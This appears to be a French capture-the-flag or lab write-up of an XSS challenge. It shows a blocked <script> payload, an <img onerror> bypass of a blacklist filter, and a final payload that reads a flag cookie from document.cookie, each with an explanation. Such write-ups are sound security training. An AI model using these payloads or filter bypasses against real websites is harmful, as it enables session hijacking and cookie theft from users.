Payload 1 : Tentative initiale (Bloquée)

* Charge utile 
<script>alert('XSS');</script>

Observation : La chaîne de caractères a été complètement supprimée de la page.

Analyse : Le site dispose d'un filtre de sécurité basique qui fonctionne sur liste noire (blacklist). Il détecte et supprime spécifiquement la balise <script>, rendant cette méthode d'injection inefficace.



Payload 2 : Contournement du filtre via un événement HTML

<img src=x onerror="alert('Contourné !')">

Observation : Une fenêtre d'alerte s'est affichée avec succès.

Analyse : Ce payload contourne le filtre en utilisant une balise HTML (<img>) généralement considérée comme inoffensive. L'astuce consiste à déclencher un événement JavaScript (onerror) en spécifiant une source d'image invalide. Le filtre ne surveillant pas cet événement, le code s'exécute.


Payload 3 : Exploitation finale et stable


Le document.cookie nous donne une chaîne comme : "cookie1=valeur1; cookie2=valeur2; ftCookies=If_You_See_Me_Its_Win".

<img src=x onerror="this.onerror=null; var v = document.cookie.split(';').find(row => row.trim().startsWith('ftCookies=')).split('=')[1]; var c = document.createElement('div'); c.textContent = 'Cookie value: ' + v; document.body.appendChild(c);">


- document.cookie.split(';'): Sépare les cookies.
- .find(row => row.trim().startsWith('ftCookies=')): C'est une façon moderne et concise de trouver le bon cookie dans le tableau.
- .split('=')[1]: Une fois le bon cookie trouvé (ex: "ftCookies=If_You_See_Me_Its_Win"), on le coupe en deux au niveau du = et on prend le deuxième morceau ([1]), qui est notre valeur.
